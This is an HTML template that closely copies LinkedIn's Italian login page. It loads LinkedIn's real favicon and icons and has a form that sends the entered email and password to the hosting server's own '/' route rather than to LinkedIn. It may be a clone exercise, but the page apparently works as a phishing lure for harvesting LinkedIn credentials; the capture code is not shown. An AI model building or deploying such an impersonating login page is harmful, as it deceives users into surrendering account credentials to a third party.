<!DOCTYPE html>
<html lang="it-IT" class="artdeco ">
<head>
    <meta http-equiv="X-UA-Compatible" content="IE=EDGE">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="asset-url" id="artdeco/static/images/icons.svg" content="https://static-exp1.licdn.com/sc/h/6bja66gymvrvqrp5m6btz3vkz">
    <title>Accesso a LinkedIn, Accesso | LinkedIn</title>
    <link rel="stylesheet" href="./css/test.css" />
    <link rel="stylesheet" href="{{ asset("css/app.css") }}" />
    <link rel="shortcut icon" href="https://static-exp1.licdn.com/sc/h/9lb1g1kp916tat669q9r5g2kz">
</head>
<body>
<div class="container-fluid">
    <div class="col-12 mt-5">
        <div class="row justify-content-center">
            <div class="col-4">
                <div class="col-12">
                    <div class="row">
                        <a class="text-decoration-none" href="/">
                            <h2 id='title' class="primaryTXT font-weight-bold">
                                Linked<i class="fab fa-linkedin"></i>
                            </h2>
                        </a>
                    </div>
                </div>
                <div class="row justify-content-center mt-3">
                    <div id="card" class="p-5">
                        <div class="col-12" id="header">
                            <div class="row">
                                <h1 class="">Accedi</h1>
                            </div>
                            <div class="row">
                                <p>Resta al passo con il tuo mondo professionale.</p>
                            </div>
                        </div>
                        <form method="POST" class="" action="/">
                            <div class="col-12">
                                <div class="row">
                                    <input
                                            id="email"
                                            name="email"
                                            type="text"
                                            class="form-control form-control-lg border border-dark inputTXT"
                                            autocomplete='off'
                                            placeholder="Email"
                                            required />
                                    <!-- <label class="" for="Email">Email</label>-->
                                </div>
                            </div>
                            <div class="col-12 mt-4">
                                <div class="row">
                                    <input
                                            id="password"
                                            type="password"
                                            aria-describedby="error-for-password"
                                            name="password"
                                            class="form-control form-control-lg border border-dark inputTXT"
                                            placeholder="Password"
                                            required
                                            aria-label="Password" />
                                    <!-- <label for="password" class="form__label--floating" aria-hidden="true">Password</label>-->
                                    <!--<span class="" id="show" role="button">mostra</span>-->
                                </div>
                            </div>
                            <div class="col-12 mt-4 ml-2">
                                <div class="row">
                                    <a href="/">
                                        <h6 id="passwordDimenticata" class="primaryTXT">Hai dimenticato la password?</h6>
                                    </a>
                                </div>
                            </div>
                            <div class="col-12 mt-4">
                                <div class="row">
                                    <button
                                            id="accediBTN"
                                            class="font-weight-bold col-12 primaryBG form-control form-control-lg p-2"
                                            type="submit">Accedi
                                    </button>
                                </div>
                            </div>
                        </form>
                    </div>
                    <div class="col-12 mt-5">
                        <div class="row justify-content-center">
                            <span id="footer">
                                Nuovo utente di LinkedIn?
                                <a href="/">
                                    <b class="primaryTXT"> Iscriviti ora</b>
                                </a>
                            </span>
                        </div>
                    </div>
                </div>

            </div>
        </div>
    </div>
</div>
</body>
</html>